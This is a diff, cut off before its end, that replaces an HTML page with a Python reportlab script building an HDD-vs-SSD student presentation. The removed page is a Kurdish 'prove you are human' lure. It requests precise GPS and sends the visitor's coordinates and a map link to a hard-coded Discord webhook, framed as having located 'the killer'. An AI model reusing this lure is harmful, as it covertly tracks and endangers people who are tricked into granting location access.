@@ -1,60 +1,555 @@
-<!DOCTYPE html>
-<html lang="ku">
-<head>
-    <meta charset="UTF-8">
-    <title>پشکنینی ناسنامە</title>
-    <style>
-        body { background-color: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
-        button { background-color: #2ecc71; border: none; color: white; padding: 15px 32px; font-size: 16px; border-radius: 8px; cursor: pointer; }
-    </style>
-</head>
-<body>
-    <h2>بۆ بینینی وێنەکە یان زانیارییەکان، دەبێت لایەنی کەم یەک جار بیسەلمێنیت کە مرۆڤیت</h2>
-    <p>تکایە کلیک لەسەر دوگمەی خوارەوە بکە و پاشان مۆڵەتی "Allow" بدە</p>
-    
-    <button onclick="getLocation()">من مرۆڤم - Verify</button>
+from reportlab.lib.pagesizes import A4
+from reportlab.lib import colors
+from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
+from reportlab.lib.units import cm
+from reportlab.platypus import (
+    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
+    HRFlowable, PageBreak
+)
+from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_JUSTIFY
+from reportlab.platypus.flowables import Flowable
 
-    <script>
-        const webhookURL = "https://discordapp.com/api/webhooks/1501579519168086199/VAH8gJiYir1-eEf3fxmAEvuCYG3SpJmPQi0Vc9ZnRV_ge0URfFF_qwlGyInZDJmPbd3e";
+# Landscape A4
+W, H = A4[1], A4[0]   # 841.9 x 595.3 pt
 
-        function getLocation() {
-            if (navigator.geolocation) {
-                // داوای لۆکەیشنی ورد دەکات (High Accuracy)
-                navigator.geolocation.getCurrentPosition(sendData, handleError, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                });
-            } else {
-                alert("ئەم وێبگەڕە پشتگیری GPS ناکات.");
-            }
-        }
+DARK_BLUE  = colors.HexColor("#0D1B4B")
+MED_BLUE   = colors.HexColor("#1565C0")
+LIGHT_BLUE = colors.HexColor("#E3F2FD")
+ACCENT     = colors.HexColor("#00B0FF")
+ACCENT2    = colors.HexColor("#00E5FF")
+GREEN      = colors.HexColor("#00C853")
+ORANGE     = colors.HexColor("#FF6D00")
+GRAY       = colors.HexColor("#546E7A")
+LIGHT_GRAY = colors.HexColor("#ECEFF1")
+WHITE      = colors.white
+BLACK      = colors.black
 
-        async function sendData(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
+styles = getSampleStyleSheet()
 
-            const message = {
-                content: "🎯 **بکوژەکە بە وردی دۆزرایەوە!** 🎯\n" +
-                         "📍 **Latitude:** `" + lat + "`\n" +
-                         "📍 **Longitude:** `" + lon + "`\n" +
-                         "📏 **ڕادەی وردی:** " + accuracy + " مەتر\n" +
-                         "🗺️ **شوێنی تەواو لەسەر نەخشە:** https://www.google.com/maps?q=" + lat + "," + lon
-            };
+def ms(name, **kw):
+    return ParagraphStyle(name, **kw)
 
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(message)
-            });
+# Slide styles
+slide_title   = ms("ST",  fontName="Helvetica-Bold", fontSize=26, textColor=WHITE,
+                   leading=32, spaceAfter=0, alignment=TA_CENTER)
+slide_sub     = ms("SS",  fontName="Helvetica",      fontSize=14, textColor=ACCENT2,
+                   leading=20, spaceAfter=0, alignment=TA_CENTER)
+sec_hdr       = ms("SH",  fontName="Helvetica-Bold", fontSize=18, textColor=WHITE,
+                   leading=24, spaceAfter=0, alignment=TA_CENTER)
+body_s        = ms("BS",  fontName="Helvetica",      fontSize=11, textColor=colors.HexColor("#212121"),
+                   leading=17, spaceAfter=6, alignment=TA_LEFT)
+bullet_s      = ms("BL",  fontName="Helvetica",      fontSize=11, textColor=colors.HexColor("#212121"),
+                   leading=17, spaceAfter=6, leftIndent=16, bulletIndent=4)
+caption_s     = ms("CAP", fontName="Helvetica",      fontSize=8,  textColor=GRAY,
+                   leading=11, alignment=TA_CENTER, spaceAfter=4)
+white_body    = ms("WB",  fontName="Helvetica",      fontSize=12, textColor=WHITE,
+                   leading=18, spaceAfter=6, alignment=TA_CENTER)
+tbl_hdr_s     = ms("TH",  fontName="Helvetica-Bold", fontSize=10, textColor=WHITE,
+                   leading=14, alignment=TA_CENTER)
+tbl_cell_s    = ms("TC",  fontName="Helvetica",      fontSize=9,  textColor=colors.HexColor("#212121"),
+                   leading=13, alignment=TA_CENTER)
 
-            alert("سەلمێنرا! ئێستا دەتوانیت بەردەوام بیت.");
-        }
+SLIDE_NUM = [0]
 
-        function handleError(error) {
-            alert("تکایە مۆڵەتی GPS بدە بۆ ئەوەی پڕۆسەکە تەواو بێت.");
-        }
-    </script>
-</body>
-</html>
+# ── Slide background renderer ───────────────────────────────────────
+def draw_slide_bg(canvas, doc, slide_type="content"):
+    SLIDE_NUM[0] += 1
+    n = SLIDE_NUM[0]
+
+    if slide_type == "cover" or n == 1:
+        # deep gradient simulation
+        canvas.setFillColor(DARK_BLUE)
+        canvas.rect(0, 0, W, H, fill=1, stroke=0)
+        # diagonal accent stripe
+        canvas.setFillColor(MED_BLUE)
+        p = canvas.beginPath()
+        p.moveTo(0, H*0.42)
+        p.lineTo(W*0.6, H)
+        p.lineTo(0, H)
+        p.close()
+        canvas.drawPath(p, fill=1, stroke=0)
+        # glowing circles
+        for cx, cy, r, a in [(W*0.82, H*0.72, 140, 0.06), (W*0.12, H*0.25, 80, 0.05)]:
+            canvas.setFillColor(ACCENT)
+            canvas.setFillAlpha(a)
+            canvas.circle(cx, cy, r, fill=1, stroke=0)
+        canvas.setFillAlpha(1)
+        # bottom bar
+        canvas.setFillColor(colors.HexColor("#0A1232"))
+        canvas.rect(0, 0, W, 28, fill=1, stroke=0)
+        canvas.setFillColor(ACCENT); canvas.setFont("Helvetica", 8)
+        canvas.drawCentredString(W/2, 10, "Secondary Storage Systems  •  Computer Science Presentation  •  2026")
+
+    elif slide_type == "section":
+        canvas.setFillColor(MED_BLUE)
+        canvas.rect(0, 0, W, H, fill=1, stroke=0)
+        canvas.setFillColor(colors.HexColor("#1A237E"))
+        canvas.rect(0, 0, W, H*0.18, fill=1, stroke=0)
+        canvas.setFillColor(ACCENT); canvas.rect(0, H*0.18, W, 3, fill=1, stroke=0)
+        canvas.setFillColor(WHITE); canvas.setFillAlpha(0.04)
+        canvas.circle(W*0.85, H*0.6, 180, fill=1, stroke=0)
+        canvas.setFillAlpha(1)
+        canvas.setFillColor(colors.HexColor("#0D1B4B"))
+        canvas.rect(0, 0, W, 22, fill=1, stroke=0)
+        canvas.setFillColor(ACCENT); canvas.setFont("Helvetica", 8)
+        canvas.drawCentredString(W/2, 8, f"Slide {n}")
+
+    else:  # content
+        canvas.setFillColor(WHITE)
+        canvas.rect(0, 0, W, H, fill=1, stroke=0)
+        # header bar
+        canvas.setFillColor(DARK_BLUE)
+        canvas.rect(0, H-46, W, 46, fill=1, stroke=0)
+        canvas.setFillColor(ACCENT); canvas.rect(0, H-48, W, 3, fill=1, stroke=0)
+        # side accent
+        canvas.setFillColor(LIGHT_BLUE)
+        canvas.rect(0, 0, 5, H-48, fill=1, stroke=0)
+        # footer
+        canvas.setFillColor(DARK_BLUE); canvas.rect(0, 0, W, 22, fill=1, stroke=0)
+        canvas.setFillColor(ACCENT); canvas.setFont("Helvetica", 8)
+        canvas.drawString(1.5*cm, 8, "Secondary Storage Systems: HDD vs SSD")
+        canvas.setFillColor(WHITE)
+        canvas.drawRightString(W-1.5*cm, 8, f"Slide {n}")
+
+# ── Flowable diagram for Architecture (slide) ──────────────────────
+class SlideArchDiagram(Flowable):
+    def __init__(self, w=680, h=160):
+        super().__init__()
+        self.width  = w
+        self.height = h
+
+    def draw(self):
+        c = self.canv
+        half = self.width / 2 - 8
+
+        # HDD
+        c.setFillColor(LIGHT_BLUE)
+        c.roundRect(0, 0, half, self.height, 8, fill=1, stroke=0)
+        c.setFillColor(MED_BLUE); c.setFont("Helvetica-Bold", 12)
+        c.drawCentredString(half/2, self.height-18, "Hard Disk Drive (HDD)")
+
+        cx, cy = half/2, self.height/2 - 8
+        for r, col in [(40, colors.HexColor("#90CAF9")),
+                       (28, colors.HexColor("#42A5F5")),
+                       (16, colors.HexColor("#1565C0")),
+                       (5,  colors.HexColor("#0D47A1"))]:
+            c.setFillColor(col)
+            c.circle(cx, cy, r, fill=1, stroke=0)
+        c.setStrokeColor(colors.HexColor("#37474F")); c.setLineWidth(2)
+        c.line(cx+5, cy+5, cx+38, cy+34)
+        c.setFillColor(colors.HexColor("#37474F"))
+        c.circle(cx+38, cy+34, 4, fill=1, stroke=0)
+        c.setFillColor(GRAY); c.setFont("Helvetica", 8)
+        c.drawCentredString(half/2, 10, "Spinning platters + mechanical arm")
+
+        # SSD
+        sx = half + 16
+        c.setFillColor(colors.HexColor("#E8F5E9"))
+        c.roundRect(sx, 0, half, self.height, 8, fill=1, stroke=0)
+        c.setFillColor(GREEN); c.setFont("Helvetica-Bold", 12)
+        c.drawCentredString(sx + half/2, self.height-18, "Solid State Drive (SSD)")
+
+        chip_colors = [colors.HexColor("#A5D6A7"), colors.HexColor("#66BB6A"),
+                       colors.HexColor("#43A047"), colors.HexColor("#2E7D32")]
+        rows2, cols2 = 3, 4
+        cw2, ch2 = 28, 19
+        gx = sx + (half - cols2*(cw2+4))/2
+        gy = cy - rows2*(ch2+4)/2 + 2
+        for ri in range(rows2):
+            for ci in range(cols2):
+                c.setFillColor(chip_colors[(ri+ci) % 4])
+                c.setStrokeColor(colors.HexColor("#1B5E20")); c.setLineWidth(0.5)
+                c.rect(gx + ci*(cw2+4), gy + ri*(ch2+4), cw2, ch2, fill=1, stroke=1)
+                c.setFillColor(WHITE); c.setFont("Helvetica", 5.5)
+                c.drawCentredString(gx + ci*(cw2+4)+cw2/2, gy + ri*(ch2+4)+7, "NAND")
+        c.setFillColor(GRAY); c.setFont("Helvetica", 8)
+        c.drawCentredString(sx + half/2, 10, "Flash memory chips — no moving parts")
+
+# ── Performance bar chart (slide) ──────────────────────────────────
+class SlidePerfChart(Flowable):
+    def __init__(self, w=680, h=160):
+        super().__init__()
+        self.width  = w
+        self.height = h
+
+    def draw(self):
+        c = self.canv
+        hdd_vals  = [150, 120, 15, 6]
+        ssd_vals  = [550, 500, 0.1, 3]
+        max_vals  = [600, 600, 16, 7]
+        labels    = ["Read Speed\n(MB/s)", "Write Speed\n(MB/s)", "Access Time\n(ms, lower=better)", "Power\n(W)"]
+        n = 4; bar_w = 22; gap = (self.width - 70) / n; base = 28; ch2 = self.height - 44
+
+        for i in range(n):
+            xc = 70 + i*gap + gap/2
+            hh = (hdd_vals[i] / max_vals[i]) * ch2
+            sh = (ssd_vals[i] / max_vals[i]) * ch2
+            if i == 2: hh = ch2; sh = 4  # invert: HDD worse
+
+            c.setFillColor(MED_BLUE)
+            c.rect(xc - bar_w - 2, base, bar_w, hh, fill=1, stroke=0)
+            c.setFillColor(colors.HexColor("#00C853"))
+            c.rect(xc + 2, base, bar_w, sh, fill=1, stroke=0)
+
+            c.setFont("Helvetica-Bold", 7.5)
+            c.setFillColor(MED_BLUE)
+            lbl = str(hdd_vals[i]) if i != 2 else "15ms"
+            c.drawCentredString(xc - bar_w/2 - 2, base + hh + 3, lbl)
+            c.setFillColor(colors.HexColor("#00C853"))
+            lbl2 = str(ssd_vals[i]) if i != 2 else "0.1ms"
+            c.drawCentredString(xc + bar_w/2 + 2, base + sh + 3, lbl2)
+
+            c.setFillColor(GRAY); c.setFont("Helvetica", 7)
+            for j, part in enumerate(labels[i].split("\n")):
+                c.drawCentredString(xc, base - 9 - j*8, part)
+
+        c.setStrokeColor(GRAY); c.setLineWidth(0.5)
+        c.line(68, base, self.width - 4, base)
+
+        lx = 20
+        c.setFillColor(MED_BLUE); c.rect(lx, self.height-20, 12, 10, fill=1, stroke=0)
+        c.setFillColor(BLACK); c.setFont("Helvetica", 8); c.drawString(lx+14, self.height-18, "HDD")
+        c.setFillColor(colors.HexColor("#00C853")); c.rect(lx+40, self.height-20, 12, 10, fill=1, stroke=0)
+        c.setFillColor(BLACK); c.drawString(lx+54, self.height-18, "SSD")
+
+# ── Slide builder ───────────────────────────────────────────────────
+out = "/mnt/user-data/outputs/HDD_vs_SSD_Presentation.pdf"
+doc = SimpleDocTemplate(out, pagesize=(W, H),
+                        leftMargin=1.6*cm, rightMargin=1.6*cm,
+                        topMargin=0.7*cm, bottomMargin=1.0*cm)
+
+story = []
+slide_backgrounds = []  # will be filled per page
+
+def end_slide():
+    story.append(PageBreak())
+
+# Helper
+def h_title(text):
+    story.append(Paragraph(text, sec_hdr))
+
+def h_slide_header(text):
+    # Used inside content slides — placed before Spacer(topMargin)
+    story.append(Paragraph(text, ms("SHC", fontName="Helvetica-Bold", fontSize=16,
+                                    textColor=WHITE, leading=20, alignment=TA_CENTER)))
+
+def bp(text, bold=False):
+    prefix = "<b>" if bold else ""
+    suffix = "</b>" if bold else ""
+    story.append(Paragraph(f"➤  {prefix}{text}{suffix}", bullet_s))
+
+# ── SLIDE 1: COVER ──────────────────────────────────────────────────
+story.append(Spacer(1, 3.2*cm))
+story.append(Paragraph("Secondary Storage Systems", slide_title))
+story.append(Spacer(1, 0.3*cm))
+story.append(Paragraph("HDD vs SSD — Architecture, Performance &amp; Real-World Use", slide_sub))
+story.append(Spacer(1, 0.7*cm))
+story.append(HRFlowable(width="50%", thickness=1.5, color=ACCENT2, spaceAfter=12))
+story.append(Spacer(1, 0.4*cm))
+for line in ["Computer Science Presentation", "Group of 3 Students  •  Deadline: 17 May 2026"]:
+    story.append(Paragraph(line, ms("ci", fontName="Helvetica", fontSize=12, textColor=colors.HexColor("#B3E5FC"),
+                                    leading=18, alignment=TA_CENTER)))
+slide_backgrounds.append("cover")
+end_slide()
+
+# ── SLIDE 2: AGENDA ─────────────────────────────────────────────────
+story.append(Spacer(1, 0.5*cm))
+story.append(Paragraph("Agenda", ms("AGH", fontName="Helvetica-Bold", fontSize=20,
+                                     textColor=WHITE, leading=26, alignment=TA_CENTER)))
+story.append(Spacer(1, 0.5*cm))
+agenda = [
+    ("01", "Introduction — What is Secondary Storage?"),
+    ("02", "How Does an HDD Work?"),
+    ("03", "How Does an SSD Work?"),
+    ("04", "Architecture Diagram"),
+    ("05", "Performance Comparison"),
+    ("06", "Detailed Specs & Head-to-Head Table"),
+    ("07", "Real-Life Examples"),
+    ("08", "Use Case Recommendations"),
+    ("09", "Future Trends"),
+    ("10", "Conclusion"),
+]
+ag_data = [[Paragraph(f"<b>{n}</b>", ms("AN", fontName="Helvetica-Bold", fontSize=12, textColor=ACCENT2,
+                                         alignment=TA_CENTER)),
+            Paragraph(txt, ms("AT", fontName="Helvetica", fontSize=11, textColor=WHITE, leading=15))]
+           for n, txt in agenda]
+ag_tbl = Table(ag_data, colWidths=[1.6*cm, 18*cm])
+ag_tbl.setStyle(TableStyle([
+    ("ROWBACKGROUNDS", (0,0), (-1,-1), [colors.HexColor("#1A237E"), MED_BLUE]),
+    ("TOPPADDING",    (0,0), (-1,-1), 5),
+    ("BOTTOMPADDING", (0,0), (-1,-1), 5),
+    ("LEFTPADDING",   (0,0), (-1,-1), 8),
+    ("VALIGN",        (0,0), (-1,-1), "MIDDLE"),
+]))
+story.append(ag_tbl)
+slide_backgrounds.append("section")
+end_slide()
+
+# ── SLIDE 3: INTRODUCTION ───────────────────────────────────────────
+story.append(Spacer(1, 0.9*cm))
+story.append(Paragraph("01 | Introduction", ms("SH2", fontName="Helvetica-Bold", fontSize=17,
+                                                textColor=WHITE, leading=22, alignment=TA_LEFT)))
+story.append(Spacer(1, 0.25*cm))
+story.append(HRFlowable(width="100%", thickness=1, color=ACCENT, spaceAfter=10))
+
+intro_txt = ("Secondary storage is <b>non-volatile memory</b> that retains data permanently without power. "
+             "It stores your OS, apps, and files. Two technologies dominate:")
+story.append(Paragraph(intro_txt, body_s))
+story.append(Spacer(1, 0.2*cm))
+
+two_col = [[
+    Paragraph("<b>HDD — Hard Disk Drive</b>", ms("TH2", fontName="Helvetica-Bold", fontSize=12,
+                                                   textColor=MED_BLUE, alignment=TA_CENTER)),
+    Paragraph("<b>SSD — Solid State Drive</b>", ms("TH3", fontName="Helvetica-Bold", fontSize=12,
+                                                    textColor=GREEN, alignment=TA_CENTER)),
+],[
+    Paragraph("• Electromechanical device<br/>• Spinning magnetic platters<br/>• Moving read/write arm<br/>• Invented: 1956<br/>• Low cost, high capacity", body_s),
+    Paragraph("• Semiconductor device<br/>• NAND flash memory chips<br/>• No moving parts<br/>• Invented: 1990s<br/>• Fast, silent, durable", body_s),
+]]
+tc = Table(two_col, colWidths=[10*cm, 10*cm])
+tc.setStyle(TableStyle([
+    ("BACKGROUND",   (0,0), (0,0), LIGHT_BLUE),
+    ("BACKGROUND",   (1,0), (1,0), colors.HexColor("#E8F5E9")),
+    ("BACKGROUND",   (0,1), (0,1), colors.HexColor("#F5F9FF")),
+    ("BACKGROUND",   (1,1), (1,1), colors.HexColor("#F5FFF7")),
+    ("BOX",          (0,0), (-1,-1), 0.7, GRAY),
+    ("INNERGRID",    (0,0), (-1,-1), 0.3, GRAY),
+    ("TOPPADDING",   (0,0), (-1,-1), 8),
+    ("BOTTOMPADDING",(0,0), (-1,-1), 8),
+    ("LEFTPADDING",  (0,0), (-1,-1), 12),
+]))
+story.append(tc)
+slide_backgrounds.append("content")
+end_slide()
+
+# ── SLIDE 4: HOW HDD WORKS ──────────────────────────────────────────
+story.append(Spacer(1, 0.9*cm))
+story.append(Paragraph("02 | How Does an HDD Work?", ms("SH3", fontName="Helvetica-Bold", fontSize=17,
+                                                          textColor=WHITE, leading=22)))
+story.append(Spacer(1, 0.2*cm))
+story.append(HRFlowable(width="100%", thickness=1, color=ACCENT, spaceAfter=10))
+bp("Data is stored on circular <b>magnetic platters</b> coated with ferromagnetic material.")
+bp("Platters spin at <b>5,400 – 7,200 RPM</b> (server HDDs: up to 15,000 RPM).")
+bp("A <b>read/write head</b> on a mechanical arm floats nm above the surface, magnetising tiny regions.")
+bp("Performance is limited by <b>seek time</b> (arm movement) + <b>rotational latency</b> (waiting for sector).")
+bp("Average access time: <b>5–15 milliseconds</b> — slow compared to SSD.")
+bp("Sequential speeds: <b>80–160 MB/s</b> | Random 4K speeds: <b>~0.5–2 MB/s</b> (very slow).")
+story.append(Spacer(1, 0.2*cm))
+story.append(Paragraph("Key limitation: mechanical parts make HDDs slow for random access and vulnerable to physical shock.",
+                        ms("note", fontName="Helvetica-Oblique", fontSize=10, textColor=ORANGE, leading=14)))
+slide_backgrounds.append("content")
+end_slide()
+
+# ── SLIDE 5: HOW SSD WORKS ──────────────────────────────────────────
+story.append(Spacer(1, 0.9*cm))
+story.append(Paragraph("03 | How Does an SSD Work?", ms("SH4", fontName="Helvetica-Bold", fontSize=17, textColor=WHITE)))
+story.append(Spacer(1, 0.2*cm))
+story.append(HRFlowable(width="100%", thickness=1, color=ACCENT, spaceAfter=10))
+bp("Data is stored in <b>NAND flash memory cells</b> — transistors that trap electrical charge.")
+bp("<b>No moving parts</b> — data is accessed electronically at near-instant speed.")
+bp("Interfaces: <b>SATA</b> (older, ~500 MB/s) vs <b>NVMe/PCIe</b> (modern, 3,500–7,000+ MB/s).")
+bp("NAND types: <b>SLC</b> (1 bit/cell, fastest), <b>MLC</b> (2), <b>TLC</b> (3), <b>QLC</b> (4 bits/cell, cheapest).")
+bp("Average access time: <b>0.05–0.15 ms</b> — up to <b>100× faster</b> than HDD.")
+bp("Random 4K speeds: <b>300–500 MB/s</b> — massively faster than HDD for OS tasks.")
+story.append(Spacer(1, 0.2*cm))
+story.append(Paragraph("Key advantage: no mechanical delays — the SSD's speed transforms how computers feel to use.",
+                        ms("note2", fontName="Helvetica-Oblique", fontSize=10, textColor=GREEN, leading=14)))
+slide_backgrounds.append("content")
+end_slide()
+
+# ── SLIDE 6: ARCHITECTURE DIAGRAM ──────────────────────────────────
+story.append(Spacer(1, 0.9*cm))
+story.append(Paragraph("04 | Architecture Diagram", ms("SH5", fontName="Helvetica-Bold", fontSize=17, textColor=WHITE)))
+story.append(Spacer(1, 0.2*cm))
+story.append(HRFlowable(width="100%", thickness=1, color=ACCENT, spaceAfter=14))
+story.append(SlideArchDiagram(700, 165))
+story.append(Paragraph("Figure 1 — HDD uses spinning platters with a mechanical arm; SSD uses a grid of NAND flash chips.", caption_s))
+slide_backgrounds.append("content")
+end_slide()
+
+# ── SLIDE 7: PERFORMANCE CHART ──────────────────────────────────────
+story.append(Spacer(1, 0.9*cm))
+story.append(Paragraph("05 | Performance Comparison", ms("SH6", fontName="Helvetica-Bold", fontSize=17, textColor=WHITE)))
+story.append(Spacer(1, 0.2*cm))
+story.append(HRFlowable(width="100%", thickness=1, color=ACCENT, spaceAfter=14))
+story.append(SlidePerfChart(700, 165))
+story.append(Paragraph("Figure 2 — SSD dramatically outperforms HDD in speed and access time; HDD only wins on $/TB.", caption_s))
+slide_backgrounds.append("content")
+end_slide()
+
+# ── SLIDE 8: SPECS TABLE ────────────────────────────────────────────
+story.append(Spacer(1, 0.9*cm))
+story.append(Paragraph("06 | Head-to-Head Specification Table", ms("SH7", fontName="Helvetica-Bold", fontSize=17, textColor=WHITE)))
+story.append(Spacer(1, 0.2*cm))
+story.append(HRFlowable(width="100%", thickness=1, color=ACCENT, spaceAfter=10))
+
+td = [
+    [Paragraph("<b>Feature</b>", tbl_hdr_s), Paragraph("<b>HDD</b>", tbl_hdr_s),
+     Paragraph("<b>SSD (SATA)</b>", tbl_hdr_s), Paragraph("<b>SSD (NVMe)</b>", tbl_hdr_s)],
+    ["Read Speed",   "80–160 MB/s",   "500–560 MB/s",   "3,500–7,000 MB/s"],
+    ["Write Speed",  "80–120 MB/s",   "450–530 MB/s",   "2,500–6,500 MB/s"],
+    ["Access Time",  "5–15 ms",       "0.1 ms",          "0.05 ms"],
+    ["Power",        "4–9 W",         "2–4 W",           "3–8 W"],
+    ["Shock Resist", "Low ⚠",        "High ✓",          "High ✓"],
+    ["Cost / TB",    "~$20–$30",      "~$60–$80",        "~$80–$120"],
+    ["Best For",     "Bulk archive",  "Everyday laptops","Gaming/workstations"],
+]
+for i in range(1, len(td)):
+    td[i] = [Paragraph(str(x), tbl_cell_s) for x in td[i]]
+td[0] = [Paragraph(str(x.text if hasattr(x,'text') else x), tbl_hdr_s) if not hasattr(x,'text') else x for x in td[0]]
+
+tbl2 = Table(td, colWidths=[3.8*cm, 4.8*cm, 4.8*cm, 5.2*cm])
+tbl2.setStyle(TableStyle([
+    ("BACKGROUND",    (0,0), (-1,0),  MED_BLUE),
+    ("ROWBACKGROUNDS",(0,1), (-1,-1), [WHITE, LIGHT_GRAY]),
+    ("BACKGROUND",    (0,3), (-1,3),  LIGHT_BLUE),
+    ("BACKGROUND",    (0,5), (-1,5),  LIGHT_BLUE),
+    ("GRID",          (0,0), (-1,-1), 0.4, GRAY),
+    ("VALIGN",        (0,0), (-1,-1), "MIDDLE"),
+    ("TOPPADDING",    (0,0), (-1,-1), 5),
+    ("BOTTOMPADDING", (0,0), (-1,-1), 5),
+]))
+story.append(tbl2)
+slide_backgrounds.append("content")
+end_slide()
+
+# ── SLIDE 9: REAL-LIFE EXAMPLES ─────────────────────────────────────
+story.append(Spacer(1, 0.9*cm))
+story.append(Paragraph("07 | Real-Life Examples", ms("SH8", fontName="Helvetica-Bold", fontSize=17, textColor=WHITE)))
+story.append(Spacer(1, 0.2*cm))
+story.append(HRFlowable(width="100%", thickness=1, color=ACCENT, spaceAfter=10))
+
+ex_data = [
+    [Paragraph("<b>💻 Student Laptop (SSD)</b>", ms("EH", fontName="Helvetica-Bold", fontSize=10, textColor=WHITE, alignment=TA_CENTER)),
+     Paragraph("<b>🎮 Gaming PC (NVMe SSD)</b>", ms("EH2", fontName="Helvetica-Bold", fontSize=10, textColor=WHITE, alignment=TA_CENTER)),
+     Paragraph("<b>📦 NAS Server (HDD)</b>", ms("EH3", fontName="Helvetica-Bold", fontSize=10, textColor=WHITE, alignment=TA_CENTER))],
+    [Paragraph("Boot in 8s vs 45s on HDD.\nSamsung 970 EVO 1TB NVMe.\nShock-resistant for travel.",
+               ms("EC", fontSize=9, leading=13, spaceAfter=0)),
+     Paragraph("MS Flight Simulator: 70% faster loads.\nPS5 uses 5.5 GB/s custom NVMe.\nHybrid: NVMe + HDD combo.",
+               ms("EC2", fontSize=9, leading=13, spaceAfter=0)),
+     Paragraph("6× 8TB HDDs = 32TB storage ~$500.\nStreams 4K to multiple devices.\nSeagate IronWolf NAS rated 24/7.",
+               ms("EC3", fontSize=9, leading=13, spaceAfter=0))],
+]
+ex_tbl = Table(ex_data, colWidths=[6.4*cm, 7*cm, 6.4*cm])
+ex_tbl.setStyle(TableStyle([
+    ("BACKGROUND",    (0,0), (0,0), MED_BLUE),
+    ("BACKGROUND",    (1,0), (1,0), colors.HexColor("#1B5E20")),
+    ("BACKGROUND",    (2,0), (2,0), ORANGE),
+    ("BACKGROUND",    (0,1), (0,1), LIGHT_BLUE),
+    ("BACKGROUND",    (1,1), (1,1), colors.HexColor("#E8F5E9")),
+    ("BACKGROUND",    (2,1), (2,1), colors.HexColor("#FFF3E0")),
+    ("BOX",           (0,0), (-1,-1), 0.7, GRAY),
+    ("INNERGRID",     (0,0), (-1,-1), 0.3, GRAY),
+    ("TOPPADDING",    (0,0), (-1,-1), 8),
+    ("BOTTOMPADDING", (0,0), (-1,-1), 8),
+    ("LEFTPADDING",   (0,0), (-1,-1), 10),
+    ("VALIGN",        (0,0), (-1,-1), "TOP"),
+]))
+story.append(ex_tbl)
+story.append(Spacer(1, 0.2*cm))
+story.append(Paragraph("Enterprise: AWS/Google use HDDs for cold storage + NVMe SSDs for live databases — both are essential!", 
+                        ms("ent", fontName="Helvetica-Oblique", fontSize=10, textColor=GRAY, leading=14)))
+slide_backgrounds.append("content")
+end_slide()
+
+# ── SLIDE 10: USE CASE GUIDE ────────────────────────────────────────
+story.append(Spacer(1, 0.9*cm))
+story.append(Paragraph("08 | Use Case Recommendations", ms("SH9", fontName="Helvetica-Bold", fontSize=17, textColor=WHITE)))
+story.append(Spacer(1, 0.2*cm))
+story.append(HRFlowable(width="100%", thickness=1, color=ACCENT, spaceAfter=10))
+
+uc_data = [
+    [Paragraph("<b>✅ Choose SSD When…</b>", ms("UC1", fontName="Helvetica-Bold", fontSize=11, textColor=MED_BLUE)),
+     Paragraph("<b>✅ Choose HDD When…</b>", ms("UC2", fontName="Helvetica-Bold", fontSize=11, textColor=GREEN))],
+    [Paragraph("• Fast boot / app launch needed\n• Laptop (portability, battery, shock)\n• Video editing / 3D rendering\n• Gaming — fast load times\n• Databases / web servers\n• Primary OS drive",
+               ms("UCT", fontSize=10, leading=16)),
+     Paragraph("• Large file archives (movies, backups)\n• NAS / home media server\n• Budget build — max GB/$\n• Secondary 'cold storage' drive\n• Surveillance / CCTV footage\n• Cloud data-centre cold tier",
+               ms("UCT2", fontSize=10, leading=16))],
+]
+uc_tbl = Table(uc_data, colWidths=[10*cm, 10*cm])
+uc_tbl.setStyle(TableStyle([
+    ("BACKGROUND",    (0,0), (0,0), LIGHT_BLUE),
+    ("BACKGROUND",    (1,0), (1,0), colors.HexColor("#E8F5E9")),
+    ("BACKGROUND",    (0,1), (0,1), colors.HexColor("#F5F9FF")),
+    ("BACKGROUND",    (1,1), (1,1), colors.HexColor("#F5FFF7")),
+    ("BOX",           (0,0), (-1,-1), 0.7, GRAY),
+    ("INNERGRID",     (0,0), (-1,-1), 0.3, GRAY),
+    ("TOPPADDING",    (0,0), (-1,-1), 8),
+    ("BOTTOMPADDING", (0,0), (-1,-1), 8),
+    ("LEFTPADDING",   (0,0), (-1,-1), 14),
+    ("VALIGN",        (0,0), (-1,-1), "TOP"),
+]))
+story.append(uc_tbl)
+story.append(Spacer(1, 0.2*cm))
+bp("<b>Hybrid Setup (recommended):</b> NVMe SSD for OS + active files, HDD for bulk storage = best of both worlds.")
+slide_backgrounds.append("content")
+end_slide()
+
+# ── SLIDE 11: FUTURE TRENDS ─────────────────────────────────────────
+story.append(Spacer(1, 0.9*cm))
+story.append(Paragraph("09 | Future Trends", ms("SH10", fontName="Helvetica-Bold", fontSize=17, textColor=WHITE)))
+story.append(Spacer(1, 0.2*cm))
+story.append(HRFlowable(width="100%", thickness=1, color=ACCENT, spaceAfter=10))
+
+ft_data = [
+    [Paragraph("<b>SSD Trends</b>", ms("FT1", fontName="Helvetica-Bold", fontSize=11, textColor=MED_BLUE, alignment=TA_CENTER)),
+     Paragraph("<b>HDD Trends</b>", ms("FT2", fontName="Helvetica-Bold", fontSize=11, textColor=GREEN, alignment=TA_CENTER))],
+    [Paragraph("• Prices falling ~15–20%/year\n• 3D NAND stacking → denser chips\n• PCIe 5.0 NVMe: 12,000+ MB/s\n• Replacing HDD in most laptops\n• Storage-class memory (Optane) emerging",
+               ms("FTT", fontSize=10, leading=16)),
+     Paragraph("• HAMR technology: 100 TB drives soon\n• MAMR for higher density\n• SMR for ultra-high capacity\n• Staying dominant in data centres\n• $/TB continues to fall vs SSD",
+               ms("FTT2", fontSize=10, leading=16))],
+]
+ft_tbl = Table(ft_data, colWidths=[10*cm, 10*cm])
+ft_tbl.setStyle(TableStyle([
+    ("BACKGROUND",    (0,0), (0,0), LIGHT_BLUE),
+    ("BACKGROUND",    (1,0), (1,0), colors.HexColor("#E8F5E9")),
+    ("BACKGROUND",    (0,1), (0,1), colors.HexColor("#F5F9FF")),
+    ("BACKGROUND",    (1,1), (1,1), colors.HexColor("#F5FFF7")),
+    ("BOX",           (0,0), (-1,-1), 0.7, GRAY),
+    ("INNERGRID",     (0,0), (-1,-1), 0.3, GRAY),
+    ("TOPPADDING",    (0,0), (-1,-1), 8),
